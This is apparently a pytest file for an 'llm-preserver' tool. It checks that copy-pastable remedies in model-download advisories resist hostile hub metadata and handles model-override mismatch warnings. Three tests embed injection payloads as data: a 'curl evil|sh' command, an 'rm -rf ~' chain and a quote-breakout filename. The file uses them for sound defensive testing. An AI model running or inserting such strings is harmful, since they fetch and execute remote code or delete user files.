"""Remedy-string hardening for advisories (spec 0005 adjudications).

Advisories print copy-pastable remedies built from hub-controlled
strings (filenames, base_model metadata, adapter config values).
Pinned here: companion patterns use llama.cpp's substring semantics,
runnable ``run: llm-preserver pull ...`` remedies are emitted only
for well-formed hub repo ids, and ``--include`` remedies are
shell-quoted so a hostile filename cannot escape them.
"""

import shlex

from llm_preserver.hub import RepoFile
from llm_preserver.pull_advisory import advisories_for

QUANT_REPO = "bartowski/tiny-chat-GGUF"


def rf(path: str, size: int = 100) -> RepoFile:
    return RepoFile(path=path, size=size, sha256=None)


def advise(tree, selected, **overrides):
    kwargs = {
        "repo_id": QUANT_REPO,
        "base_model": None,
        "adapter_base": None,
        "archived_repos": frozenset(),
    }
    kwargs.update(overrides)
    return advisories_for(tree, selected, None, **kwargs)


def test_mid_name_mmproj_triggers_the_advisory():
    # llama.cpp classifies companions by substring (download.cpp
    # excludes filenames *containing* mmproj); real repos ship
    # <model>-mmproj-f16.gguf, which a prefix-only pattern would miss —
    # the gemma failure shape all over again.
    tree = [rf("gemma-tiny-Q4_K_M.gguf"), rf("gemma-tiny-mmproj-f16.gguf")]

    advisories = advise(tree, [tree[0]])

    assert [a.kind for a in advisories] == ["vision projector"]


def test_hostile_adapter_base_never_becomes_a_runnable_command():
    hostile = "victim; curl evil|sh"
    tree = [rf("adapter_model.safetensors")]

    advisories = advise(tree, tree, adapter_base=hostile)

    [advisory] = advisories
    assert advisory.kind == "adapter base model"
    assert "run: llm-preserver pull" not in advisory.message
    assert "not a valid hub repo id" in advisory.message


def test_hostile_base_model_never_becomes_a_runnable_command():
    hostile = "evil/repo && rm -rf ~"
    tree = [rf("tiny-chat-Q4_K_M.gguf")]

    advisories = advise(tree, tree, base_model=hostile)

    [advisory] = advisories
    assert advisory.kind == "full-precision master"
    assert "run: llm-preserver pull" not in advisory.message
    assert "not a valid hub repo id" in advisory.message


def test_well_formed_repo_ids_keep_the_runnable_remedy():
    tree = [rf("tiny-chat-Q4_K_M.gguf")]

    advisories = advise(
        tree,
        tree,
        base_model="Qwen/Qwen3-0.6B",
        adapter_base="acme/base-7b",
    )

    messages = [a.message for a in advisories]
    assert any("run: llm-preserver pull acme/base-7b" in m for m in messages)
    assert any("run: llm-preserver pull Qwen/Qwen3-0.6B --whole-repo" in m for m in messages)


def test_model_override_matching_neither_base_nor_repo_id_warns_mismatch():
    # The live footgun (2026-07-12): a copy-pasted --model archived a
    # 0.6B quant into a 35B model directory with no warning. --model
    # stays verbatim (0003) — the advisory names both values, never
    # blocks. Human error outranks missing companions: severity
    # "warning", and it sorts FIRST regardless of the other rows.
    tree = [rf("Qwen3-0.6B-Q4_K_M.gguf"), rf("mmproj-F16.gguf")]

    advisories = advise(
        tree,
        [tree[0]],  # mmproj excluded → a companion advisory also fires
        repo_id="unsloth/Qwen3-0.6B-GGUF",
        base_model="Qwen/Qwen3-0.6B",
        model_override="Qwen/Qwen3.6-35B-A3B",
        archived_repos=frozenset({"Qwen/Qwen3-0.6B"}),  # silence the master row
    )

    assert [a.kind for a in advisories] == ["grouping mismatch", "vision projector"]
    mismatch = advisories[0]
    assert mismatch.severity == "warning"
    assert advisories[1].severity == "advisory"
    assert "Qwen/Qwen3-0.6B" in mismatch.message
    assert "Qwen/Qwen3.6-35B-A3B" in mismatch.message


def test_model_override_equal_to_declared_base_advises_nothing():
    tree = [rf("Qwen3-0.6B-Q4_K_M.gguf")]

    advisories = advise(
        tree,
        tree,
        repo_id="unsloth/Qwen3-0.6B-GGUF",
        base_model="Qwen/Qwen3-0.6B",
        model_override="Qwen/Qwen3-0.6B",
        archived_repos=frozenset({"Qwen/Qwen3-0.6B"}),
    )

    assert advisories == []


def test_model_override_equal_to_repo_id_advises_nothing():
    # Grouping a repo under itself is the sanctioned derived-model /
    # standalone default (0003/0004), not a mismatch.
    tree = [rf("Qwen3-0.6B-Q4_K_M.gguf")]

    advisories = advise(
        tree,
        tree,
        repo_id="unsloth/Qwen3-0.6B-GGUF",
        base_model="Qwen/Qwen3-0.6B",
        model_override="unsloth/Qwen3-0.6B-GGUF",
        archived_repos=frozenset({"Qwen/Qwen3-0.6B"}),
    )

    assert advisories == []


def test_no_model_override_advises_no_mismatch():
    # Without --model the grouping came from base_model (confirmed or
    # inferred) — there is nothing to disagree with.
    tree = [rf("Qwen3-0.6B-Q4_K_M.gguf")]

    advisories = advise(
        tree,
        tree,
        repo_id="unsloth/Qwen3-0.6B-GGUF",
        base_model="Qwen/Qwen3-0.6B",
        archived_repos=frozenset({"Qwen/Qwen3-0.6B"}),
    )

    assert advisories == []


def test_include_remedy_is_shell_quoted_against_hostile_filenames():
    # A single quote in a hub filename must not break out of the
    # suggested --include argument when copy-pasted into a shell.
    hostile_name = "mmproj-x'; rm -rf ~ #.gguf"
    tree = [rf("tiny-chat-Q4_K_M.gguf"), rf(hostile_name)]

    advisories = advise(tree, [tree[0]])

    [advisory] = advisories
    remedy = advisory.message.split("--include", 1)[1].strip()
    assert remedy == shlex.quote(f"*{hostile_name}")
    assert shlex.split(remedy) == [f"*{hostile_name}"]
